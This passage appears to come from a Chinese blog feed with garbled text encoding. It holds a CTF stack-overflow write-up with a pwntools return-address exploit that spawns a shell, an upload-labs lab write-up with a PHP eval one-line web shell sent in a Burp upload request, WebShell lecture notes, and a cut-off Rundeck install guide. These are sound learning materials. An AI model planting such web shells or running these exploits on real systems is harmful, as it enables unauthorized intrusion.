+--------------------+<br><br>Bye!<br><br></code></pre></td></tr></table></figure><h1 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h1><p>åˆ†æmainå‡½æ•°ï¼Œå‘ç°æœ‰æç¤ºï¼šcall winå‡½æ•°</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230827220453.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Your goal is to call `win` function (located at %p)\n&quot;</span>, win);<br>  vuln();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œè¯»å–äº†ä¸€äº›å†…å®¹å­˜åˆ°äº†bufå˜é‡é‡Œï¼Œç„¶åå°±è°ƒç”¨äº†returnå‡½æ•°ï¼Œå¯ä»¥ç”¨è¿™ä¸ªæ ˆæº¢å‡ºæ¼æ´æ¥è¿›è¡Œåˆ©ç”¨</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230827222917.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br><br>  _show_stack(buf);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input: &quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x200</span>uLL);<br>  <span class="hljs-keyword">return</span> _show_stack(buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹winå‡½æ•°ï¼Œçœ‹åˆ°æœ‰system(â€œ&#x2F;bin&#x2F;shâ€)çš„æŒ‡ä»¤ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230827221057.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">win</span><span class="hljs-params">()</span><br>&#123;<br>  _QWORD v0[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br><br>  v0[<span class="hljs-number">1</span>] = v0;<br>  <span class="hljs-keyword">if</span> ( ((<span class="hljs-type">unsigned</span> __int8)v0 &amp; <span class="hljs-number">0xF</span>) != <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Oops! RSP is misaligned!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Some functions such as `system` use `movaps` instructions in libc-2.27 and later.&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This instruction fails when RSP is not a multiple of 0x10.&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Find a way to align RSP! You&#x27;re almost there!&quot;</span>);<br>    sleep(<span class="hljs-number">1u</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Congratulations!&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  &#125;<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°system(â€œ&#x2F;bin&#x2F;shâ€);çš„åœ°å€ä¸ºï¼š0x00000000004008C4</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230827221439.png" alt="image.png"></p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf">.<span class="hljs-built_in">text</span>:<span class="hljs-number">00000000004008</span>C4 <span class="hljs-number">48</span> <span class="hljs-number">8</span>D <span class="hljs-number">3</span>D C4 <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          lea     rdi, command                    ; <span class="hljs-string">&quot;/bin/sh&quot;</span><br>.<span class="hljs-built_in">text</span>:<span class="hljs-number">00000000004008</span>CB E8 A0 FD FF FF                <span class="hljs-built_in">call</span>    <span class="hljs-variable">_system</span><br></code></pre></td></tr></table></figure><h1 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h1><p>æ‰¾åˆ°å¡«å……çš„é—´éš”ä¸º32</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230827223128.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan 3rd]<span class="hljs-comment"># ./pwn</span><br>Your goal is to call `win` <span class="hljs-keyword">function</span> (located at 0x400861)<br><br>   [ Address ]           [ Stack ]<br>                   +--------------------+<br>0x00007ffce7496290 | 0x00007f258a829b40 | &lt;-- buf<br>                   +--------------------+<br>0x00007ffce7496298 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffce74962a0 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffce74962a8 | 0x00007f258aa44170 |<br>                   +--------------------+<br>0x00007ffce74962b0 | 0x00007ffce74962c0 | &lt;-- saved rbp (vuln)<br>                   +--------------------+<br>0x00007ffce74962b8 | 0x000000000040084e | &lt;-- <span class="hljs-built_in">return</span> address (vuln)<br>                   +--------------------+<br>0x00007ffce74962c0 | 0x0000000000400ad0 | &lt;-- saved rbp (main)<br>                   +--------------------+<br>0x00007ffce74962c8 | 0x00007f258a449c87 | &lt;-- <span class="hljs-built_in">return</span> address (main)<br>                   +--------------------+<br>0x00007ffce74962d0 | 0x0000000000000001 |<br>                   +--------------------+<br>0x00007ffce74962d8 | 0x00007ffce74963a8 |<br>                   +--------------------+<br><br>Input: ^C<br>[root@ningan 3rd]<span class="hljs-comment">#</span><br>[root@ningan 3rd]<span class="hljs-comment"># python</span><br>Python 3.6.9 (default, Mar 10 2023, 16:46:00)<br>[GCC 8.4.0] on linux<br>Type <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;copyright&quot;</span>, <span class="hljs-string">&quot;credits&quot;</span> or <span class="hljs-string">&quot;license&quot;</span> <span class="hljs-keyword">for</span> more information.<br>&gt;&gt;&gt; 0x00007ffce74962b0 - 0x00007ffce7496290<br>32<br><br></code></pre></td></tr></table></figure><p>ä¸Šé¢å·²ç»æ‰¾åˆ°system(â€œ&#x2F;bin&#x2F;shâ€);çš„åœ°å€ä¸ºï¼š0x00000000004008C4</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment"># io = remote(&quot;xxxx&quot;, 9999)  </span><br> <br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br><br>padding = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">32</span> + <span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span><br>return_addr = <span class="hljs-number">0x00000000004008C4</span><br>payload = padding + p64(return_addr)<br><br>io.recvuntil(<span class="hljs-string">&#x27;Input: &#x27;</span>)<br>io.sendline(payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfé¢˜ç›®ç³»åˆ—ã€‘upload-labsé¶åœº web æ–‡ä»¶ä¸Šä¼ æ¼æ´</title>
    <link href="/2023/08/24/ctf/unsupported/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91upload-labs%E9%9D%B6%E5%9C%BA%20web%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/08/24/ctf/unsupported/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91upload-labs%E9%9D%B6%E5%9C%BA%20web%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/c0ny1/upload-labs">upload-labs githubé“¾æ¥</a></p><h1 id="é¶åœºæ­å»º"><a href="#é¶åœºæ­å»º" class="headerlink" title="é¶åœºæ­å»º"></a>é¶åœºæ­å»º</h1><p><a href="https://cloud.tencent.com/developer/article/2196769">phpStudy 2016æ­å»º-upload-labsé¶åœº</a></p><h1 id="01"><a href="#01" class="headerlink" title="01"></a>01</h1><p>ç›´æ¥åœ¨æµè§ˆå™¨æºä»£ç çš„ä½ç½®ä¿®æ”¹ä¸æˆåŠŸï¼Œæ‰€ä»¥é€‰æ‹©åœ¨burpä¸Šè¿›è¡Œå°è¯•<br>å°†shell.phpæ”¹ä¸ºshell.pngï¼Œä¸Šä¼ è¯¥pngå›¾ç‰‡ï¼Œç”¨burpæ‹¦æˆª<br>ä¿®æ”¹filenameä¸ºshell.php</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Pass-01/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.20.201<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>317<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.20.201<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryeHo9xtvBYEh3wzgK<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.20.201/Pass-01/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=node01ked3r2wvuewui081fs0tsx7517.node0<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-php">------WebKitFormBoundaryeHo9xtvBYEh3wzgK</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;upload_file&quot;</span>; filename=<span class="hljs-string">&quot;shell.php&quot;</span></span><br><span class="language-php">Content-Type: image/png</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) <span class="hljs-meta">?&gt;</span></span><br><span class="language-php">------WebKitFormBoundaryeHo9xtvBYEh3wzgK</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot;</span></span><br><span class="language-php"></span><br><span class="language-php">ä¸Šä¼ </span><br><span class="language-php">------WebKitFormBoundaryeHo9xtvBYEh3wzgK--</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) <span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfå­¦ä¹ ç³»åˆ—ã€‘WebShellä¸æ–‡ä»¶ä¸Šä¼ æ¼æ´</title>
    <link href="/2023/08/24/ctf/%E3%80%90ctf%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E3%80%91WebShell%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/08/24/ctf/%E3%80%90ctf%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E3%80%91WebShell%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="è¯´æ˜"><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h2><p><a href="https://www.bilibili.com/video/BV1qb4y1J7LK/?p=4&spm_id_from=pageDriver">Bç«™è§†é¢‘</a><br>è¯¥åšå®¢å†…å®¹ä¸ºBç«™è§†é¢‘æ‰€å¯¹åº”çš„pptï¼Œä»…ä½œç¬”è®°ä½¿ç”¨ï¼Œå¦‚æœ‰ä¾µæƒï¼Œè¯·è”ç³»å¤„ç†~</p><h2 id="è¯¾ä»¶å†…å®¹"><a href="#è¯¾ä»¶å†…å®¹" class="headerlink" title="è¯¾ä»¶å†…å®¹"></a>è¯¾ä»¶å†…å®¹</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824095009.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824075534.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[x]);&gt;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824075600.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824075815.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824080049.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824080141.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824080214.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824080517.png" alt="image.png"></p><p>èšå‰‘ä¸æ”¯æŒedu.cnï¼Œå¯ä»¥ç”¨å“¥æ–¯æ‹‰Godzillaè½¯ä»¶</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824081206.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824081236.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824081316.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824081357.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824081522.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824081708.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824081839.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824083045.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824083148.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824083224.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824083435.png" alt="image.png"></p><p>010eidtoræ‰“å¼€ä¸€ä¸ªæ–‡ä»¶</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824083413.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824083451.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824083650.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824083721.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824092944.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824093126.png" alt="image.png"><br>::DATA  ä½œä¸ºä¸€ä¸ªæ•°æ®æµ</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824093244.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824093548.png" alt="image.png"></p><p>20æ”¹æˆ00ï¼Œä¼šå­˜åœ¨ä¸€ä¸ªç©ºå­—ç¬¦</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824094308.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824094335.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824094617.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824094630.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824094656.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824094741.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824094943.png" alt="image.png"></p><p>å®‰è£…å“¥æ–¯æ‹‰<br>burpä¸­ä¸ºä»€ä¹ˆæ²¡æœ‰render<br>å¸¸ç”¨çš„mime</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€linuxç³»åˆ—ã€‘(202308) ubuntu18.04è™šæ‹Ÿæœºä¸­å®‰è£…Rundeck</title>
    <link href="/2023/08/23/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202308)%20ubuntu18.04%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E5%AE%89%E8%A3%85Rundeck/"/>
    <url>/2023/08/23/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202308)%20ubuntu18.04%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E5%AE%89%E8%A3%85Rundeck/</url>
    
    <content type="html"><![CDATA[<h2 id="ä¸‹è½½ã€å®‰è£…"><a href="#ä¸‹è½½ã€å®‰è£…" class="headerlink" title="ä¸‹è½½ã€å®‰è£…"></a>ä¸‹è½½ã€å®‰è£…</h2><p><a href="https://www.rundeck.com/downloads">Rundeck</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230823145827.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan rundeck]<span class="hljs-comment"># apt-get install openjdk-8-jdk-headless</span><br>[root@ningan rundeck]<span class="hljs-comment"># dpkg -i rundeck_4.15.0.20230725-1_all.deb</span><br></code></pre></td></tr></table></figure><h2 id="å¯åŠ¨"><a href="#å¯åŠ¨" class="headerlink" title="å¯åŠ¨"></a>å¯åŠ¨</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>[root@ningan rundeck]<span class="hljs-comment"># /etc/init.d/rundeckd start</span><br>[ ok ] Starting rundeckd (via systemctl): rundeckd.service.<br>[root@ningan rundeck]<span class="hljs-comment">#</span><br><br>[root@ningan rundeck]<span class="hljs-comment"># ps -ef |grep runde</span><br>rundeck   6677     1 99 14:52 ?        00:01:28 java -Drundeck.jaaslogin=<span class="hljs-literal">true</span> -Djava.security.auth.login.config=/etc/rundeck/jaas-loginmodule.conf -Dloginmodule.name=RDpropertyfilelogin -Drdeck.config=/etc/rundeck -Drundeck.server.configDir=/etc/rundeck -Dserver.datastore.path=/var/lib/rundeck/data/rundeck -Drundeck.server.serverDir=/var/lib/rundeck -Drdeck.projects=/var/lib/rundeck/projects -Dlog4j.configurationFile=/etc/rundeck/log4j2.properties -Dlogging.config=file:/etc/rundeck/log4j2.properties -Drdeck.runlogs=/var/lib/rundeck/logs -Drundeck.server.logDir=/var/lib/rundeck/logs -Drundeck.config.location=/etc/rundeck/rundeck-config.properties -Djava.io.tmpdir=/tmp/rundeck -Drundeck.server.workDir=/tmp/rundeck -Dserver.http.port=4440 -Drdeck.base=/var/lib/rundeck -Xmx1024m -Xms256m -XX:MaxMetaspaceSize=256m -server -jar /var/lib/rundeck/bootstrap/rundeck-4.15.0-20230725.war --skipinstall<br>root      7234 25419  0 14:53 pts/0    00:00:00 grep --color=auto runde<br><br><br><span class="hljs-comment">### æ³¨æ„ï¼šå¯åŠ¨ä¹‹åï¼Œå¾—è¿‡ä¸€ä¼šæ‰èƒ½çœ‹åˆ°è¿™ä¸ªç«¯å£å ç”¨</span><br>[root@ningan rundeck]<span class="hljs-comment"># netstat -nltp |grep 4440</span><br>tcp6       0      0 :::4440                 :::*                    LISTEN      6677/java<br><br></code></pre></td></tr></table></figure><p>åœ¨å®¿ä¸»æœºä¸Šè®¿é—®ï¼š<a href="http://192.168.20.201:4440/">http://192.168.20.201:4440/</a> è¿›è¡Œè®¿é—®ï¼Œç”¨æˆ·åå’Œå¯†ç éƒ½è¾“å…¥adminï¼Œä¸€ç›´åœ¨è½¬åœˆåœˆè¿›ä¸å»ã€‚åæ¥æ‰¾äº†ç½‘ä¸Šçš„åšå®¢ï¼Œåœ¨è®¿é—®å‰éœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶&#x2F;etc&#x2F;rundeck&#x2F;rundeck-config.properties<br>ä¿®æ”¹è¿™ä¸€è¡Œï¼Œ</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">å°†<br>grails.serverURL=http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">4440</span><br>ä¿®æ”¹ä¸º<br>grails.serverURL=http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.201</span>:<span class="hljs-number">4440</span><br></code></pre></td></tr></table></figure><p>ä¿®æ”¹å®Œä¹‹åï¼Œé‡å¯ </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan rundeck]<span class="hljs-comment"># /etc/init.d/rundeckd restart</span><br><br><span class="hljs-comment">### æ³¨æ„ï¼šå¯åŠ¨ä¹‹åï¼Œå¾—è¿‡ä¸€ä¼šæ‰èƒ½çœ‹åˆ°è¿™ä¸ªç«¯å£å ç”¨</span><br>[root@ningan rundeck]<span class="hljs-comment"># netstat -nltp |grep 4440</span><br>tcp6       0      0 :::4440                 :::*                    LISTEN      6677/java<br><br></code></pre></td></tr></table></figure><p>ç­‰4440å·²ç»å¯åŠ¨èµ·æ¥äº†ï¼Œå†æ¬¡åœ¨æµè§ˆå™¨ä¸­è®¿é—®ï¼Œå°±èƒ½è¿›å»äº†~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230823151254.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230823151235.png" alt="image.png"></p><h2 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h2><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">rundeckd [start|<span class="hljs-type">stop</span>|<span class="hljs-type">restart</span>|<span class="hljs-type">condrestart</span>|<span class="hljs-type">status</span>]<br></code></pre></td></tr></table></figure><h2 id="å¸¸ç”¨æ“ä½œ"><a href="#å¸¸ç”¨æ“ä½œ" class="headerlink" title="å¸¸ç”¨æ“ä½œ"></a>å¸¸ç”¨æ“ä½œ</h2><h3 id="åˆ›å»ºtoken"><a href="#åˆ›å»ºtoken" class="headerlink" title="åˆ›å»ºtoken"></a>åˆ›å»ºtoken</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230823165813.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230823165839.png" alt="image.png"></p><h2 id="å¸¸ç”¨æ¥å£æ“ä½œ"><a href="#å¸¸ç”¨æ¥å£æ“ä½œ" class="headerlink" title="å¸¸ç”¨æ¥å£æ“ä½œ"></a>å¸¸ç”¨æ¥å£æ“ä½œ</h2><h3 